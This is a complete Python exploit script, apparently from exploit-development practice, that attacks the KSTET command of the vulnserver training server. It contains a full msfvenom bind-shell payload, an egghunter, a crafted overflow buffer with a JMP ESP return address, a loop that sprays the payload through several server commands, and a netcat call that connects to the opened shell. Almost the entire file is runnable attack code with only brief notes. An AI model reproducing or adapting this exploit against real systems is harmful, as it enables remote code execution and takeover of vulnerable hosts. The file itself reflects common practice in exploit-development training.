#!/usr/bin/python

import socket
import sys
import subprocess
import time

host = "172.16.66.128"
port = 9999

#########################################
## WriTTen by:van6uard
## vulnserver KSTET Exploit
## 
## Address=62501203  Message=  0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\..\Desktop\vulnserver\essfunc.dll)
## Played around with the short jmp and nailed the beginning of the buffer.
## 
## badchars = '\x00'  had to send in 4 small batches.
## Egghunter , tag w00t : 
## "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
## "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
## Put this tag in front of your shellcode : w00tw00t
##
## msfvenom -p windows/shell_bind_tcp -b '\x00' -f python -v shellcode
## [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
## [-] No arch selected, selecting arch: x86 from the payload
## Found 11 compatible encoders
## Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
## x86/shikata_ga_nai succeeded with size 355 (iteration=0)
## x86/shikata_ga_nai chosen with final size 355
## Payload size: 355 bytes
## Final size of python file: 1916 bytes
#########################################


shellcode =  ""
shellcode += "w00tw00t"
shellcode += "\xd9\xc4\xd9\x74\x24\xf4\xb8\x1e\x95\xed\x50\x5d"
shellcode += "\x29\xc9\xb1\x53\x31\x45\x17\x83\xed\xfc\x03\x5b"
shellcode += "\x86\x0f\xa5\x9f\x40\x4d\x46\x5f\x91\x32\xce\xba"
shellcode += "\xa0\x72\xb4\xcf\x93\x42\xbe\x9d\x1f\x28\x92\x35"
shellcode += "\xab\x5c\x3b\x3a\x1c\xea\x1d\x75\x9d\x47\x5d\x14"
shellcode += "\x1d\x9a\xb2\xf6\x1c\x55\xc7\xf7\x59\x88\x2a\xa5"
shellcode += "\x32\xc6\x99\x59\x36\x92\x21\xd2\x04\x32\x22\x07"
shellcode += "\xdc\x35\x03\x96\x56\x6c\x83\x19\xba\x04\x8a\x01"
shellcode += "\xdf\x21\x44\xba\x2b\xdd\x57\x6a\x62\x1e\xfb\x53"
shellcode += "\x4a\xed\x05\x94\x6d\x0e\x70\xec\x8d\xb3\x83\x2b"
shellcode += "\xef\x6f\x01\xaf\x57\xfb\xb1\x0b\x69\x28\x27\xd8"
shellcode += "\x65\x85\x23\x86\x69\x18\xe7\xbd\x96\x91\x06\x11"
shellcode += "\x1f\xe1\x2c\xb5\x7b\xb1\x4d\xec\x21\x14\x71\xee"
shellcode += "\x89\xc9\xd7\x65\x27\x1d\x6a\x24\x20\xd2\x47\xd6"
shellcode += "\xb0\x7c\xdf\xa5\x82\x23\x4b\x21\xaf\xac\x55\xb6"
shellcode += "\xd0\x86\x22\x28\x2f\x29\x53\x61\xf4\x7d\x03\x19"
shellcode += "\xdd\xfd\xc8\xd9\xe2\x2b\x64\xd1\x45\x84\x9b\x1c"
shellcode += "\x35\x74\x1c\x8e\xde\x9e\x93\xf1\xff\xa0\x79\x9a"
shellcode += "\x68\x5d\x82\xb5\x34\xe8\x64\xdf\xd4\xbc\x3f\x77"
shellcode += "\x17\x9b\xf7\xe0\x68\xc9\xaf\x86\x21\x1b\x77\xa9"
shellcode += "\xb1\x09\xdf\x3d\x3a\x5e\xdb\x5c\x3d\x4b\x4b\x09"
shellcode += "\xaa\x01\x1a\x78\x4a\x15\x37\xea\xef\x84\xdc\xea"
shellcode += "\x66\xb5\x4a\xbd\x2f\x0b\x83\x2b\xc2\x32\x3d\x49"
shellcode += "\x1f\xa2\x06\xc9\xc4\x17\x88\xd0\x89\x2c\xae\xc2"
shellcode += "\x57\xac\xea\xb6\x07\xfb\xa4\x60\xee\x55\x07\xda"
shellcode += "\xb8\x0a\xc1\x8a\x3d\x61\xd2\xcc\x41\xac\xa4\x30"
shellcode += "\xf3\x19\xf1\x4f\x3c\xce\xf5\x28\x20\x6e\xf9\xe3"
shellcode += "\xe0\x9e\xb0\xa9\x41\x37\x1d\x38\xd0\x5a\x9e\x97"
shellcode += "\x17\x63\x1d\x1d\xe8\x90\x3d\x54\xed\xdd\xf9\x85"
shellcode += "\x9f\x4e\x6c\xa9\x0c\x6e\xa5"

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

buf = 'KSTET /.:/'
buf += egghunter + 'A'*(66-len(egghunter))
buf += '\x03\x12\x50\x62'                   #EIP
buf += '\xeb\xb8\x90\x90'                   #ESP
buf += 'C'*(5000-66-4)                      #ESP
buf += '\x00\x00'

## Spraying payload onto the stack with Egg

for command in ["STATS ", "RTIME ", "LTIME ", "SRUN ", "TRUN ", "GMON ", "GDOG ", "HTER ", "LTER ", "KSTAN "]:
    print "[*] Attempting to store shellcode in " + (command) + " command."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print s.recv(1024)
    shell = command + shellcode 
    s.send(shell)
    print s.recv(1024)
    s.close()



try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.recv(1024)
    c.send(buf + '\r\n')
    print "[+] Evil shellcode sent..."
#    c.close()
    time.sleep(5)
#    subprocess.call(['nc -nv 192.168.0.15 4444'], shell=True)
    subprocess.call(['nc -nv 172.16.66.128 4444'], shell=True)


except:
    print "[-] Can't send evil buffer"
    sys.exit()
